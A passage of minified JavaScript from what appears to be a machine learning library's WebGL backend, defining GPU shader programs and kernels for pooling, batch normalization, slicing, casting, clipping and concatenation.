            this.userCode = `\n      const ivec3 strides =\n        ivec3(${a}, ${c}, ${l});\n      const ivec3 pads = ivec3(${g}, ${b}, ${x});\n      const float initializationValue = ${y};\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float count = 0.0;\n\n      float getValue(int batch, int xD, int xR, int xC, int ch) {\n        if (xC < 0 || xC >= ${t.inWidth}) {\n          return initializationValue;\n        }\n        count += 1.0;\n        return getX(batch, xD, xR, xC, ch);\n      }\n\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int batch = coords.x;\n        int ch = coords.u;\n\n        ivec3 xCorner = ivec3(coords.y, coords.z, coords.w) * strides - pads;\n        int xDCorner = xCorner.x;\n        int xRCorner = xCorner.y;\n        int xCCorner = xCorner.z;\n\n        // max/min x(?, ?, ?, d) to get y(yD, yR, yC, ch).\n        // ? = to be determined\n        vec4 minMaxValue = vec4(${y});\n        float avgValue = 0.0;\n        count = 0.0;\n\n        for (int wD = 0; wD < ${p};\n            wD += ${u}) {\n          int xD = xDCorner + wD;\n\n          if (xD < 0 || xD >= ${t.inDepth}) {\n            continue;\n          }\n\n          for (int wR = 0; wR < ${f};\n            wR += ${d}) {\n            int xR = xRCorner + wR;\n\n            if (xR < 0 || xR >= ${t.inHeight}) {\n              continue;\n            }\n\n            for (int wC = 0; wC < ${k}; wC += 4) {\n              int xC = xCCorner + wC * ${h};\n\n              vec4 values = vec4(\n                getValue(batch, xD, xR, xC, ch),\n                getValue(batch, xD, xR, xC + ${h}, ch),\n                getValue(batch, xD, xR, xC + 2 * ${h}, ch),\n                getValue(batch, xD, xR, xC + 3 * ${h}, ch)\n              );\n\n              ${T}\n            }\n\n            int xC = xCCorner + ${k};\n            if (${1 === S}) {\n              vec4 values = vec4(\n                getValue(batch, xD, xR, xC, ch),\n                initializationValue,\n                initializationValue,\n                initializationValue\n              );\n\n              ${T}\n            } else if (${2 === S}) {\n              vec4 values = vec4(\n                getValue(batch, xD, xR, xC, ch),\n                getValue(batch, xD, xR, xC + ${h}, ch),\n                initializationValue,\n                initializationValue\n              );\n\n              ${T}\n            } else if (${3 === S}) {\n              vec4 values = vec4(\n                getValue(batch, xD, xR, xC, ch),\n                getValue(batch, xD, xR, xC + ${h}, ch),\n                getValue(batch, xD, xR, xC + 2 * ${h}, ch),\n                initializationValue\n              );\n\n              ${T}\n            }\n          }\n        }\n        setOutput(${C});\n      }\n    `
        }
    }
    const mA = {
        kernelName: Ca,
        backendName: "webgl",
        kernelFunc: function fA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t;
            ra(o, "avgPool");
            const {filterSize: r, strides: i, pad: a, dimRoundingMode: c} = s;
            v(Te(i, 1), (()=>`Error in avgPool: Either strides or dilations must be 1. Got strides ${i} and dilations '1'`));
            const u = pn(o.shape, r, i, 1, a, c);
            if (1 === u.filterWidth && 1 === u.filterHeight && Rt(u.inShape, u.outShape))
                return Je({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            const d = new ca(u,"avg",!1);
            return e.runWebGLProgram(d, [o], "float32")
        }
    };
    const bA = {
        kernelName: va,
        backendName: "webgl",
        kernelFunc: function gA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {filterSize: r, strides: i, pad: a, dimRoundingMode: c, dataFormat: l} = s
              , d = ss(o.shape, r, i, [1, 1, 1], a, c, l)
              , h = new Dp(d,"avg",!1);
            return e.runWebGLProgram(h, [o], "float32")
        }
    };
    class xA {
        constructor(t) {
            this.variableNames = ["dy"],
            this.outputShape = t.inShape;
            const e = t.filterHeight
              , s = t.filterWidth
              , o = t.strideHeight
              , r = t.strideWidth
              , i = t.dilationHeight
              , a = t.dilationWidth
              , c = t.effectiveFilterHeight
              , l = t.effectiveFilterWidth
              , u = c - 1 - t.padInfo.top
              , d = l - 1 - t.padInfo.left
              , h = 1 / (e * s);
            this.userCode = `\n      const ivec2 pads = ivec2(${u}, ${d});\n      const float avgMultiplier = float(${h});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n\n        ivec2 dyRCCorner = coords.yz - pads;\n        int dyRCorner = dyRCCorner.x;\n        int dyCCorner = dyRCCorner.y;\n\n        // Convolve dy(?, ?, d) with pos mask(:, :, d) to get dx(xR, xC, d).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < ${c};\n            wR += ${i}) {\n          float dyR = float(dyRCorner + wR) / ${o}.0;\n\n          if (dyR < 0.0 || dyR >= ${t.outHeight}.0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          for (int wC = 0; wC < ${l};\n            wC+= ${a}) {\n            float dyC = float(dyCCorner + wC) / ${r}.0;\n\n            if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            float dyValue = getDy(b, idyR, idyC, d);\n\n            dotProd += dyValue * avgMultiplier;\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class yA {
        constructor(t) {
            this.variableNames = ["dy"],
            this.outputShape = t.inShape;
            const e = t.filterDepth
              , s = t.filterHeight
              , o = t.filterWidth
              , r = t.strideDepth
              , i = t.strideHeight
              , a = t.strideWidth
              , c = t.dilationDepth
              , l = t.dilationHeight
              , u = t.dilationWidth
              , d = t.effectiveFilterDepth
              , h = t.effectiveFilterHeight
              , p = t.effectiveFilterWidth
              , f = d - 1 - t.padInfo.front
              , m = h - 1 - t.padInfo.top
              , g = p - 1 - t.padInfo.left
              , b = 1 / (e * s * o);
            this.userCode = `\n      const ivec3 pads = ivec3(${f}, ${m}, ${g});\n      const float avgMultiplier = float(${b});\n\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int batch = coords.x;\n        int ch = coords.u;\n\n        ivec3 dyCorner = ivec3(coords.y, coords.z, coords.w) - pads;\n        int dyDCorner = dyCorner.x;\n        int dyRCorner = dyCorner.y;\n        int dyCCorner = dyCorner.z;\n\n        // Convolve dy(?, ?, ?, d) with pos mask(:, :, :, ch) to get\n        // dx(xD, xR, xC, ch).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n\n        for (int wD = 0; wD < ${d};\n            wD += ${c}) {\n          float dyD = float(dyDCorner + wD) / ${r}.0;\n\n          if (dyD < 0.0 || dyD >= ${t.outDepth}.0 || fract(dyD) > 0.0) {\n            continue;\n          }\n          int idyD = int(dyD);\n\n          for (int wR = 0; wR < ${h};\n              wR += ${l}) {\n            float dyR = float(dyRCorner + wR) / ${i}.0;\n\n            if (dyR < 0.0 || dyR >= ${t.outHeight}.0 ||\n                fract(dyR) > 0.0) {\n              continue;\n            }\n            int idyR = int(dyR);\n\n            for (int wC = 0; wC < ${p};\n                wC += ${u}) {\n              float dyC = float(dyCCorner + wC) / ${a}.0;\n\n              if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                  fract(dyC) > 0.0) {\n                continue;\n              }\n              int idyC = int(dyC);\n\n              float dyValue = getDy(batch, idyD, idyR, idyC, ch);\n\n              dotProd += dyValue * avgMultiplier;\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    const wA = {
        kernelName: iu,
        backendName: "webgl",
        kernelFunc: function IA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , i = r
              , {filterSize: a, strides: c, pad: l, dimRoundingMode: u} = s
              , h = ss(i.shape, a, c, [1, 1, 1], l, u)
              , p = new yA(h);
            return e.runWebGLProgram(p, [o], i.dtype)
        }
    };
    const vA = {
        kernelName: ru,
        backendName: "webgl",
        kernelFunc: function CA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , i = r;
            ra([o, r], "avgPoolGrad");
            const {filterSize: a, strides: c, pad: l} = s
              , u = pn(i.shape, a, c, 1, l)
              , d = new xA(u);
            return e.runWebGLProgram(d, [o], i.dtype)
        }
    };
    const kA = {
        kernelName: Sa,
        backendName: "webgl",
        kernelFunc: function SA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {a: o, b: r} = t
              , {transposeA: i, transposeB: a} = s;
            return Ll({
                a: o,
                b: r,
                transposeA: i,
                transposeB: a,
                backend: e
            })
        }
    };
    class TA {
        constructor(t, e, s, o, r, i) {
            this.outputShape = [],
            this.variableNames = ["x", "mean", "variance"],
            gt(t, e),
            gt(t, s);
            let a = "0.0";
            null != o && (gt(t, o),
            this.variableNames.push("offset"),
            a = "getOffsetAtOutCoords()");
            let c = "1.0";
            null != r && (gt(t, r),
            this.variableNames.push("scale"),
            c = "getScaleAtOutCoords()"),
            this.outputShape = t,
            this.userCode = `\n      void main() {\n        float x = getXAtOutCoords();\n        float mean = getMeanAtOutCoords();\n        float variance = getVarianceAtOutCoords();\n        float offset = ${a};\n        float scale = ${c};\n        float inv = scale * inversesqrt(variance + float(${i}));\n        setOutput(dot(vec3(x, -mean, offset), vec3(inv, inv, 1)));\n      }\n    `
        }
    }
    class NA {
        constructor(t, e, s, o, r, i) {
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.variableNames = ["x", "mean", "variance"],
            gt(t, e),
            gt(t, s);
            let a = "vec4(0.0)";
            null != o && (gt(t, o),
            this.variableNames.push("offset"),
            a = "getOffsetAtOutCoords()");
            let c = "vec4(1.0)";
            null != r && (gt(t, r),
            this.variableNames.push("scale"),
            c = "getScaleAtOutCoords()"),
            this.outputShape = t,
            this.userCode = `\n      void main() {\n        vec4 offset = ${a};\n        vec4 scale = ${c};\n\n        vec4 x = getXAtOutCoords();\n        vec4 mean = getMeanAtOutCoords();\n        vec4 variance = getVarianceAtOutCoords();\n\n        vec4 inv = scale * inversesqrt(variance + vec4(${i}));\n\n        setOutput((x - mean) * inv + offset);\n      }\n    `
        }
    }
    const RA = {
        kernelName: Va,
        backendName: "webgl",
        kernelFunc: ({inputs: n, backend: t, attrs: e})=>{
            const {x: s, mean: o, variance: r, offset: i, scale: a} = n;
            v(o.shape.length === r.shape.length, (()=>"Batch normalization gradient requires mean and variance to have equal ranks.")),
            v(null == i || o.shape.length === i.shape.length, (()=>"Batch normalization gradient requires mean and offset to have equal ranks.")),
            v(null == a || o.shape.length === a.shape.length, (()=>"Batch normalization gradient requires mean and scale to have equal ranks."));
            let {varianceEpsilon: c} = e;
            null == c && (c = .001);
            const l = [s, o, r];
            let u = null;
            null != i && (u = i.shape,
            l.push(i));
            let d = null;
            null != a && (d = a.shape,
            l.push(a));
            const h = z().getBool("WEBGL_PACK_NORMALIZATION") ? new NA(s.shape,o.shape,r.shape,u,d,c) : new TA(s.shape,o.shape,r.shape,u,d,c);
            return t.runWebGLProgram(h, l, l[0].dtype)
        }
    };
    class $A {
        constructor(t) {
            this.variableNames = ["source"],
            this.outputShape = t,
            this.rank = t.length;
            const e = Wt(this.rank);
            this.customUniforms = [{
                name: "start",
                arrayIndex: this.rank,
                type: "int"
            }];
            const s = function GA(n) {
                if (1 === n)
                    return "sourceLoc";
                if (n <= 6)
                    return Wp.slice(0, n).map((t=>"sourceLoc." + t)).join(",");
                throw Error(`Slicing for rank ${n} is not yet supported`)
            }(this.rank);
            let o;
            o = `\n        ${e} sourceLoc;\n        ${e} coords = getOutputCoords();\n        ${t.map(((i,a)=>`sourceLoc.${Wp[a]} = start[${a}] + coords.${Wp[a]};`)).join("\n")}\n      `,
            this.userCode = `\n      void main() {\n        ${o}\n        setOutput(getSource(${s}));\n      }\n    `
        }
    }
    const Wp = ["x", "y", "z", "w", "u", "v"];
    class LA {
        constructor(t) {
            this.variableNames = ["source"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = t,
            this.rank = t.length,
            this.customUniforms = [{
                name: "start",
                arrayIndex: this.rank,
                type: "int"
            }];
            const e = Wt(this.rank)
              , s = We("coords", this.rank)
              , o = We("sourceLoc", this.rank)
              , r = 1 === this.rank ? "sourceLoc" : `vec2(${o.slice(-2).join()})`
              , i = `getChannel(getSource(${o.join()}), ${r})`
              , a = `\n      result.x = ${i};\n      if (++${s[this.rank - 1]} < ${t[this.rank - 1]}) {\n        ++${o[this.rank - 1]};\n        result.y = ${i};\n        --${o[this.rank - 1]};\n      }\n    `
              , c = 1 === this.rank ? "" : `\n      --${s[this.rank - 1]};\n      if (++${s[this.rank - 2]} < ${t[this.rank - 2]}) {\n        ++${o[this.rank - 2]};\n        result.z = ${i};\n        if (++${s[this.rank - 1]} < ${t[this.rank - 1]}) {\n          ++${o[this.rank - 1]};\n          result.w = ${i};\n        }\n      }\n    `
              , l = this.rank <= 4 ? `sourceLoc = coords +\n            ${e}(${t.map(((u,d)=>`start[${d}]`)).join()});` : t.map(((u,d)=>`${o[d]} = ${s[d]} + start[${d}];`)).join("\n");
            this.userCode = `\n      void main() {\n        ${e} coords = getOutputCoords();\n        ${e} sourceLoc;\n        ${l}\n        vec4 result = vec4(0.);\n        ${a}\n        ${c}\n        setOutput(result);\n      }\n    `
        }
    }
    function xr(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {begin: r, size: i} = s
          , [a,c] = zc(o, r, i);
        if (qd(o, a, c),
        0 === Z(c))
            return e.makeTensorInfo(c, o.dtype, []);
        if (e.shouldExecuteOnCPU([o]) || "string" === o.dtype) {
            const d = e.texData.get(o.dataId)
              , h = kz(d.values, a, c, o.shape, o.dtype);
            return e.makeTensorInfo(c, o.dtype, h)
        }
        const {isPacked: l} = e.texData.get(o.dataId)
          , u = eh(o.shape, a, c);
        if (l || !u) {
            const d = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") ? new LA(c) : new $A(c)
              , h = [a];
            return e.runWebGLProgram(d, [o], o.dtype, h)
        }
        return e.uploadToGPU(o.dataId),
        function EA(n, t, e, s) {
            const o = s.texData.get(n.dataId)
              , r = s.makeTensorInfo(e, n.dtype)
              , i = s.texData.get(r.dataId);
            Object.assign(i, o),
            i.refCount = 1,
            i.shape = e,
            i.dtype = n.dtype;
            let a = nh(t, ct(n.shape));
            o.slice && (a += o.slice.flatOffset),
            i.slice = {
                flatOffset: a,
                origDataId: o.slice && o.slice.origDataId || n.dataId
            };
            const c = s.dataRefCount.get(i.slice.origDataId) || 1;
            return s.dataRefCount.set(i.slice.origDataId, c + 1),
            r
        }(o, a, c, e)
    }
    const DA = {
        kernelName: dc,
        backendName: "webgl",
        kernelFunc: xr
    }
      , WA = {
        kernelName: ka,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockShape: r, crops: i} = s;
            v(o.shape.length <= 4, (()=>"batchToSpaceND for rank > 4 with a WebGL backend not implemented yet"));
            const a = r.reduce(((x,I)=>x * I))
              , c = Mi(o.shape, r, a)
              , l = Vi(c.length, r.length)
              , u = Fi(o.shape, r, a)
              , d = ah(i, r.length)
              , h = ch(u, i, r.length)
              , p = []
              , f = tt({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: c
                }
            })
              , m = Me({
                inputs: {
                    x: f
                },
                backend: e,
                attrs: {
                    perm: l
                }
            })
              , g = tt({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    shape: u
                }
            })
              , b = xr({
                inputs: {
                    x: g
                },
                backend: e,
                attrs: {
                    begin: d,
                    size: h
                }
            });
            return p.push(f),
            p.push(m),
            p.push(g),
            p.forEach((x=>e.disposeIntermediateTensorInfo(x))),
            b
        }
    };
    const VA = {
        kernelName: au,
        backendName: "webgl",
        kernelFunc: function MA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, weights: r} = t
              , {size: i} = s
              , a = e.readSync(o.dataId)
              , c = e.readSync(r.dataId)
              , l = C1(a, c, r.dtype, r.shape, i);
            return e.makeTensorInfo([i], r.dtype, l)
        }
    };
    const AA = {
        kernelName: cu,
        backendName: "webgl",
        kernelFunc: function XA(n) {
            const {inputs: t, backend: e} = n
              , {a: s, b: o} = t
              , r = z().getBool("WEBGL_PACK_BINARY_OPERATIONS")
              , i = z().getNumber("WEBGL_VERSION");
            if (e.shouldExecuteOnCPU([s, o]) || 1 === i) {
                const c = e.texData.get(s.dataId).values
                  , l = e.texData.get(o.dataId).values
                  , [u,d] = YF(s.shape, o.shape, c, l, s.dtype)
                  , h = e.makeTensorInfo(d, s.dtype);
                return e.texData.get(h.dataId).values = u,
                h
            }
            let a;
            return a = r ? new gr("\n  int r = int(a.r) & int(b.r);\n  int g = int(a.g) & int(b.g);\n  int rb = int(a.b) & int(b.b);\n  int ra = int(a.a) & int(b.a);\n  return vec4(r, g, rb, ra);\n",s.shape,o.shape,!1) : new ko("\n  return float(int(a.r) & int(b.r));\n",s.shape,o.shape),
            e.runWebGLProgram(a, [s, o], s.dtype)
        }
    };
    const OA = {
        kernelName: xf,
        backendName: "webgl",
        kernelFunc: function PA(n) {
            const {inputs: t, backend: e} = n
              , {s0: s, s1: o} = t
              , r = e.readSync(s.dataId)
              , i = e.readSync(o.dataId)
              , a = gt(Array.from(r), Array.from(i));
            return e.makeTensorInfo([a.length], "int32", Int32Array.from(a))
        }
    }
      , H1 = Ce({
        opSnippet: "return float(a != b);",
        cpuKernelImpl: gz,
        dtype: "bool"
    })
      , KA = {
        kernelName: qa,
        backendName: "webgl",
        kernelFunc: H1
    };
    function la(n) {
        const {inputs: t, backend: e} = n
          , {input: s} = t;
        return Je({
            inputs: {
                x: e.texData.get(s.dataId).complexTensorInfos.real
            },
            backend: e
        })
    }
    const ZA = {
        kernelName: Mu,
        backendName: "webgl",
        kernelFunc: la
    }
      , BA = "return float(int(x));";
    const _A = {
        kernelName: Gr,
        backendName: "webgl",
        kernelFunc: function Mp(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {dtype: r} = s;
            if ("complex64" === r) {
                if ("complex64" === o.dtype)
                    return Je({
                        inputs: {
                            x: o
                        },
                        backend: e
                    });
                const i = ge(o.shape)
                  , a = Mp({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        dtype: "float32"
                    }
                })
                  , c = zs({
                    inputs: {
                        real: a,
                        imag: i
                    },
                    backend: e
                });
                return i.dispose(),
                e.disposeIntermediateTensorInfo(a),
                c
            }
            if ("complex64" === o.dtype) {
                const i = la({
                    inputs: {
                        input: o
                    },
                    backend: e
                })
                  , a = Mp({
                    inputs: {
                        x: i
                    },
                    backend: e,
                    attrs: {
                        dtype: r
                    }
                });
                return e.disposeIntermediateTensorInfo(i),
                a
            }
            if (!hf(o.dtype, r)) {
                const i = Je({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
                return {
                    dataId: i.dataId,
                    shape: i.shape,
                    dtype: r
                }
            }
            if (e.shouldExecuteOnCPU([o])) {
                const i = e.texData.get(o.dataId).values
                  , [a,c,l] = QF(i, o.shape, o.dtype, r);
                return e.makeTensorInfo(a, c, l)
            }
            if ("int32" === r)
                return function HA(n, t) {
                    const e = new jn(n.shape,BA)
                      , s = t.runWebGLProgram(e, [n], "int32");
                    return {
                        dataId: s.dataId,
                        shape: s.shape,
                        dtype: s.dtype
                    }
                }(o, e);
            if ("bool" === r) {
                const i = e.makeTensorInfo([], "bool", Se("bool", 1))
                  , c = H1({
                    inputs: {
                        a: o,
                        b: i
                    },
                    backend: e
                });
                return e.disposeIntermediateTensorInfo(i),
                c
            }
            throw new Error(`Error in Cast: failed to cast ${o.dtype} to ${r}`)
        }
    }
      , _1 = "return ceil(x);"
      , UA = Tt({
        opSnippet: _1,
        packedOpSnippet: _1,
        cpuKernelImpl: JF
    })
      , YA = {
        kernelName: Lr,
        backendName: "webgl",
        kernelFunc: UA
    };
    class QA {
        constructor(t) {
            this.variableNames = ["A"],
            this.customUniforms = [{
                name: "minVal",
                type: "float"
            }, {
                name: "maxVal",
                type: "float"
            }],
            this.outputShape = t,
            this.userCode = "\n\n      void main() {\n        float value = getAAtOutCoords();\n        if (isnan(value)) {\n          setOutput(value);\n          return;\n        }\n\n        setOutput(clamp(value, minVal, maxVal));\n      }\n    "
        }
    }
    class JA {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "minVal",
                type: "float"
            }, {
                name: "maxVal",
                type: "float"
            }],
            this.outputShape = t,
            this.userCode = "\n      void main() {\n        vec4 value = getAAtOutCoords();\n\n        if (any(isnan(value))) {\n          setOutput(value);\n          return;\n        }\n\n        setOutput(clamp(value, vec4(minVal), vec4(maxVal)));\n      }\n    "
        }
    }
    const qA = {
        kernelName: Er,
        backendName: "webgl",
        kernelFunc: function jA(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {clipValueMin: r, clipValueMax: i} = s;
            let a;
            a = z().getBool("WEBGL_PACK_CLIP") ? new JA(o.shape) : new QA(o.shape);
            const c = [[r], [i]];
            return e.runWebGLProgram(a, [o], o.dtype, c)
        }
    };
    class tP {
        constructor(t) {
            this.variableNames = ["real", "imag"],
            this.outputShape = t,
            this.userCode = "\n      void main() {\n        float re = abs(getRealAtOutCoords());\n        float im = abs(getImagAtOutCoords());\n        float mx = max(re, im);\n\n        // sadly the length function in glsl is not underflow-safe\n        // (at least not on Intel GPUs). So the safe solution is\n        // to ensure underflow-safety in all cases.\n        setOutput(\n          mx == 0.0 ? 0.0 : mx * length(vec2(1, min(re, im)/mx))\n        );\n      }\n    "
        }
    }
    function U1(n, t) {
        return {
            dataId: t.dataId,
            dtype: t.dtype,
            shape: n.shape
        }
    }
    const nP = {
        kernelName: Ta,
        backendName: "webgl",
        kernelFunc: function eP(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t
              , o = e.texData.get(s.dataId)
              , r = new tP(s.shape)
              , i = [U1(s, o.complexTensorInfos.real), U1(s, o.complexTensorInfos.imag)];
            return e.runWebGLProgram(r, i, i[0].dtype)
        }
    };
    class sP {
        constructor(t) {
            this.outputShape = [],
            this.outputShape = Kn(t, 1),
            this.variableNames = t.map(((i,a)=>`T${a}`));
            const e = new Array(t.length - 1);
            e[0] = t[0][1];
            for (let i = 1; i < e.length; i++)
                e[i] = e[i - 1] + t[i][1];
            const s = [`if (yC < ${e[0]}) setOutput(getT0(yR, yC));`];
            for (let i = 1; i < e.length; i++) {
                const a = e[i - 1];
                s.push(`else if (yC < ${e[i]}) setOutput(getT${i}(yR, yC-${a}));`)
            }
            const o = e.length
              , r = e[e.length - 1];
            s.push(`else setOutput(getT${o}(yR, yC-${r}));`),
            this.userCode = `\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int yR = coords.x;\n        int yC = coords.y;\n\n        ${s.join("\n        ")}\n      }\n    `
        }
    }
    class oP {
        constructor(t, e) {
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = [],
            this.outputShape = Kn(t, e);
            const s = this.outputShape
              , o = s.length
              , r = Wt(o)
              , i = We("coords", o)
              , a = ["x", "y", "z", "w", "u", "v"].slice(0, o);
            this.variableNames = t.map(((m,g)=>`T${g}`));
            const c = new Array(t.length - 1);
            c[0] = t[0][e];
            for (let m = 1; m < c.length; m++)
                c[m] = c[m - 1] + t[m][e];
            const l = a[e]
              , u = a.slice(-2)
              , d = a.join();
            let h = `if (${l} < ${c[0]}) {\n        return getChannel(\n            getT0(${d}), vec2(${u.join()}));\n        }`;
            for (let m = 1; m < c.length; m++) {
                const g = c[m - 1];
                h += `\n        if (${l} < ${c[m]}  && ${l} >= ${c[m - 1]}) {\n          return getChannel(\n            getT${m}(${Dl(a, l, g)}),\n            vec2(${Dl(u, l, g)}));\n        }`
            }
            const p = c.length
              , f = c[c.length - 1];
            h += `\n        return getChannel(\n          getT${p}(${Dl(a, l, f)}),\n          vec2(${Dl(u, l, f)}));`,
            this.userCode = `\n      float getValue(${a.map((m=>"int " + m))}) {\n        ${h}\n      }\n\n      void main() {\n        ${r} coords = getOutputCoords();\n        vec4 result = vec4(getValue(${i}), 0., 0., 0.);\n\n        ${i[o - 1]} = ${i[o - 1]} + 1;\n        if (${i[o - 1]} < ${s[o - 1]}) {\n          result.g = getValue(${i});\n        }\n\n        ${i[o - 2]} = ${i[o - 2]} + 1;\n        if (${i[o - 2]} < ${s[o - 2]}) {\n          result.a = getValue(${i});\n        }\n\n        ${i[o - 1]} = ${i[o - 1]} - 1;\n        if (${i[o - 2]} < ${s[o - 2]} &&\n            ${i[o - 1]} < ${s[o - 1]}) {\n          result.b = getValue(${i});\n        }\n        setOutput(result);\n      }\n    `
        }
    }
    function Dl(n, t, e) {
        const s = n.indexOf(t);
        return n.map(((r,i)=>i === s ? `${r} - ${e}` : r)).join()
    }
    function Wl(n) {
        const {inputs: t, backend: e} = n
          , {input: s} = t;
        return Je({
            inputs: {
                x: e.texData.get(s.dataId).complexTensorInfos.imag
            },
            backend: e
        })
    }
    const rP = {
        kernelName: Nu,
        backendName: "webgl",
        kernelFunc: Wl
    };
    function ua(n, t, e) {
        const s = n[0].dtype;
        if ("complex64" === s) {
            const p = n.map((x=>la({
                inputs: {
                    input: x
                },
                backend: e
            })))
              , f = n.map((x=>Wl({
                inputs: {
                    input: x
                },
                backend: e
            })))
              , m = ua(p, t, e)
              , g = ua(f, t, e)
              , b = zs({
                inputs: {
                    real: m,
                    imag: g
                },
                backend: e
            });
            return p.forEach((x=>e.disposeIntermediateTensorInfo(x))),
            f.forEach((x=>e.disposeIntermediateTensorInfo(x))),
            e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(g),
            b
        }
        let o = e.shouldExecuteOnCPU(n);
        if ("string" === s && (o = !0),
        o) {
            const p = n.map((y=>{
                const C = [-1, Z(y.shape.slice(t))];
                return tt({
                    inputs: {
                        x: y
                    },
                    backend: e,
                    attrs: {
                        shape: C
                    }
                })
            }
            ))
              , f = p.map((y=>({
                vals: e.readSync(y.dataId),
                shape: y.shape
            })))
              , m = Kn(p.map((y=>y.shape)), 1)
              , g = 1 === p[0].shape[0]
              , b = jF(f, m, s, g)
              , x = Kn(n.map((y=>y.shape)), t)
              , I = e.makeTensorInfo(x, s, b);
            return p.forEach((y=>e.disposeIntermediateTensorInfo(y))),
            I
        }
        const r = n.filter((p=>Z(p.shape) > 0))
          , i = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") && r[0].shape.length > 1;
        if (1 === r.length) {
            const p = i ? new jn(n[0].shape,Vs) : new Fs(n[0].shape,Vs);
            return e.runWebGLProgram(p, n, s)
        }
        const a = z().getNumber("WEBGL_MAX_TEXTURES_IN_SHADER");
        if (r.length > a) {
            const p = [];
            for (let m = 0; m < r.length; m += a) {
                const g = r.slice(m, m + a);
                p.push(ua(g, t, e))
            }
            const f = ua(p, t, e);
            for (const m of p)
                e.disposeIntermediateTensorInfo(m);
            return f
        }
        if (i) {
            const p = new oP(r.map((f=>f.shape)),t);
            return e.runWebGLProgram(p, r, s)
        }
        const {tensors2D: c, outShape: l} = function iP(n, t, e) {
            const s = Kn(n.map((r=>r.shape)), t);
            return {
                tensors2D: n.map((r=>tt({
                    inputs: {
                        x: r
                    },
                    attrs: {
                        shape: [-1, Z(r.shape.slice(t))]
                    },
                    backend: e
                }))),
                outShape: s
            }
        }(r, t, e)
          , u = new sP(c.map((p=>p.shape)))
          , d = e.runWebGLProgram(u, c, s);
        c.forEach((p=>e.disposeIntermediateTensorInfo(p)));
        const h = tt({
            inputs: {
                x: d
            },
            attrs: {
                shape: l
            },
            backend: e
        });
        return e.disposeIntermediateTensorInfo(d),
        h
    }
    function Y1(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {axis: o} = s
          , r = It(o, t[0].shape)[0];
        oh(t.map((l=>l.shape)), r);
        const a = Kn(t.map((l=>l.shape)), r);
        if (0 === Z(a))
            return e.makeTensorInfo(a, t[0].dtype, []);
        const c = t.filter((l=>Z(l.shape) > 0));
        return 1 === c.length ? Je({
            inputs: {
                x: c[0]
            },
            backend: e
        }) : ua(c, r, e)
    }
    const aP = {
        kernelName: Na,
        backendName: "webgl",
        kernelFunc: Y1
    };
    class Q1 {
        constructor(t, e=!1, s=null, o=!1, r=!1) {
            this.variableNames = ["x", "W"],
            this.outputShape = t.outShape;
            const i = t.padInfo.top
              , a = t.padInfo.left
              , c = t.strideHeight
              , l = t.strideWidth
              , u = t.dilationHeight
              , d = t.dilationWidth
              , h = t.filterHeight
              , p = t.filterWidth
              , f = 4 * Math.floor(t.inChannels / 4)
              , m = t.inChannels % 4
              , g = "channelsLast" === t.dataFormat
              , b = g ? 1 : 2
              , x = g ? 2 : 3
              , I = g ? 3 : 1;
            let y = ""
              , w = "";
            s && (y = o ? `float activation(float a) {\n          float b = getPreluActivationWeightsAtOutCoords();\n          ${s}\n        }` : r ? `float activation(float a) {\n          float b = getLeakyreluAlphaAtOutCoords();\n          ${s}\n        }` : `\n          float activation(float x) {\n            ${s}\n          }\n        `,
            w = "result = activation(result);");
            const C = e ? "result += getBiasAtOutCoords();" : "";
            e && this.variableNames.push("bias"),
            o && this.variableNames.push("preluActivationWeights"),
            r && this.variableNames.push("leakyreluAlpha"),
